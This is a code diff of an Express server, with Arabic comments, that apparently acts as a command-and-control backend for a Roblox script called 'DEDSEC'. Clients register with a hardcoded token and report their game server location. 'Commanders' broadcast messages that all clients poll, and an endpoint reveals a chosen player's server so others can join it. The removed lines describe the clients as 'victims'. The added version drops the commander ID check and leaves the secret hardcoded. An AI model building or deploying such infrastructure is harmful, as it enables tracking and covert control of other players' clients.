@@ -1,149 +1,126 @@
 const express = require('express');
 const cors = require('cors');
-
 const app = express();
-const PORT = process.env.PORT || 3000;
 
-// Middleware
+// ========== إعدادات الأمان ==========
+const SECRET_TOKEN = "DEDSEC_SECURE_2025_X7K9P2"; // يجب أن يطابق السكربت
+
+// ========== تخزين مؤقت في الذاكرة ==========
+let lastCommand = {
+    time: 0,
+    username: "",
+    userId: 0,
+    message: "",
+    token: ""
+};
+
+// قائمة اللاعبين النشطين: username -> { placeId, jobId, lastPing }
+const activePlayers = new Map();
+
+// مدة صلاحية اللاعب (30 ثانية بدون ping يعتبر غير نشط)
+const PLAYER_TIMEOUT_MS = 30000;
+
+// تنظيف دوري للاعبين المنقطعين
+setInterval(() => {
+    const now = Date.now();
+    for (const [username, data] of activePlayers.entries()) {
+        if (now - data.lastPing > PLAYER_TIMEOUT_MS) {
+            activePlayers.delete(username);
+        }
+    }
+}, 10000);
+
+// ========== إعدادات Express ==========
 app.use(cors());
-app.use(express.json({ limit: '10mb' }));
+app.use(express.json());
 
-// ========== الإعدادات الأمنية ==========
-const SECRET_TOKEN = "DEDSEC_SECURE_2025_X7K9P2";  // يجب أن يكون مطابقاً لما في سكربت العميل
+// للتعامل مع طلبات Roblox التي قد ترسل Content-Type غريب
+app.use((req, res, next) => {
+    if (req.headers['content-type'] === 'application/json' || req.method === 'POST') {
+        // جيد
+    }
+    next();
+});
 
-// قائمة معرفات القادة (UserId)
-const COMMANDER_IDS = new Set([
-    5113390090,
-    9172039074,
-    9316949567,
-    9836788803,
-    9855423901
-]);
+// ========== نقاط النهاية ==========
 
-// تخزين البيانات
-let playersData = [];           // قائمة الأسماء المسجلة
-let commandQueue = [];          // قائمة الأوامر المرسلة للضحايا
-let lastCommandTime = 0;        // آخر وقت تم فيه إضافة أمر
-
-// ========== دوال مساعدة ==========
-function isCommander(userId) {
-    return COMMANDER_IDS.has(userId);
-}
-
-// ========== نقاط النهاية (Endpoints) ==========
-
-// 1. استقبال ping من العملاء (تسجيل وجودهم)
+// 1. استقبال ping من اللاعبين
 app.post('/ping', (req, res) => {
     const { username, userId, placeId, jobId, token } = req.body;
     
-    // التحقق من المفتاح السري
+    // تحقق من التوكن
     if (token !== SECRET_TOKEN) {
-        return res.status(403).json({ error: 'Invalid token' });
+        return res.status(403).json({ error: "Invalid token" });
+    }
+    
+    if (!username) {
+        return res.status(400).json({ error: "Username required" });
     }
     
     // تحديث أو إضافة اللاعب
-    const existing = playersData.find(p => p.username === username);
-    if (existing) {
-        existing.placeId = placeId;
-        existing.jobId = jobId;
-        existing.lastSeen = Date.now();
-    } else {
-        playersData.push({
-            username,
-            userId,
-            placeId,
-            jobId,
-            lastSeen: Date.now()
-        });
-    }
-    
-    // تنظيف اللاعبين غير النشطين (آخر 30 ثانية)
-    playersData = playersData.filter(p => Date.now() - p.lastSeen < 30000);
-    
-    res.json({ status: 'ok' });
-});
-
-// 2. الحصول على قائمة اللاعبين المسجلين
-app.get('/players', (req, res) => {
-    const names = playersData.map(p => p.username);
-    res.json(names);
-});
-
-// 3. الحصول على بيانات لاعب معين (لأمر jointotarget)
-app.get('/player/:username', (req, res) => {
-    const { username } = req.params;
-    const player = playersData.find(p => p.username === username);
-    if (!player) {
-        return res.status(404).json({ error: 'Player not found' });
-    }
-    res.json({
-        username: player.username,
-        placeId: player.placeId,
-        jobId: player.jobId
+    activePlayers.set(username, {
+        userId,
+        placeId,
+        jobId,
+        lastPing: Date.now()
     });
+    
+    res.json({ status: "ok" });
 });
 
-// 4. استقبال أمر من القائد (يتم تخزينه في قائمة الانتظار)
+// 2. استقبال أمر جديد من قائد
 app.post('/update', (req, res) => {
     const { username, userId, message, time, token } = req.body;
     
-    // التحقق من المفتاح السري
+    // تحقق من التوكن
     if (token !== SECRET_TOKEN) {
-        return res.status(403).json({ error: 'Invalid token' });
+        return res.status(403).json({ error: "Invalid token" });
     }
     
-    // التحقق من أن المرسل قائد معتمد
-    if (!isCommander(userId)) {
-        return res.status(403).json({ error: 'Unauthorized commander' });
+    if (!username || !userId || !message || !time) {
+        return res.status(400).json({ error: "Missing fields" });
     }
     
-    // التحقق من أن الطلب جديد (لم يتم معالجته سابقاً)
-    if (time <= lastCommandTime) {
-        return res.status(409).json({ error: 'Command already processed' });
-    }
-    
-    // تخزين الأمر في قائمة الانتظار
-    commandQueue.push({
+    // تحديث الأمر الأخير
+    lastCommand = {
+        time,
         username,
         userId,
         message,
-        time
-    });
+        token
+    };
     
-    // تحديث آخر وقت تمت معالجته
-    lastCommandTime = time;
-    
-    res.json({ status: 'queued' });
+    res.json({ status: "ok" });
 });
 
-// 5. الحصول على أحدث أمر من قائمة الانتظار (للعرض على الضحايا)
+// 3. جلب آخر أمر (لجميع اللاعبين)
 app.get('/data', (req, res) => {
-    if (commandQueue.length === 0) {
-        return res.status(204).end();
+    res.json(lastCommand);
+});
+
+// 4. جلب قائمة اللاعبين النشطين (أسماء فقط)
+app.get('/players', (req, res) => {
+    const usernames = Array.from(activePlayers.keys());
+    res.json(usernames);
+});
+
+// 5. جلب بيانات لاعب محدد (لأمر الانضمام)
+app.get('/player/:username', (req, res) => {
+    const username = req.params.username;
+    const playerData = activePlayers.get(username);
+    
+    if (!playerData) {
+        return res.status(404).json({ error: "Player not found" });
     }
-    // نأخذ أحدث أمر فقط (آخر عنصر في المصفوفة)
-    const latest = commandQueue[commandQueue.length - 1];
-    // نرسل الأمر مع المفتاح السري ليتم التحقق منه في العميل
+    
     res.json({
-        username: latest.username,
-        userId: latest.userId,
-        message: latest.message,
-        time: latest.time,
-        token: SECRET_TOKEN
+        placeId: playerData.placeId,
+        jobId: playerData.jobId
     });
 });
 
-// نقطة إضافية لتفريغ قائمة الأوامر (اختياري)
-app.delete('/clear', (req, res) => {
-    const { token } = req.body;
-    if (token !== SECRET_TOKEN) {
-        return res.status(403).json({ error: 'Invalid token' });
-    }
-    commandQueue = [];
-    res.json({ status: 'cleared' });
-});
-
-// بدء الخادم
+// ========== تشغيل السيرفر ==========
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    // لا يوجد طباعة
+    console.log(`DEDSEC server running on port ${PORT}`);
 });
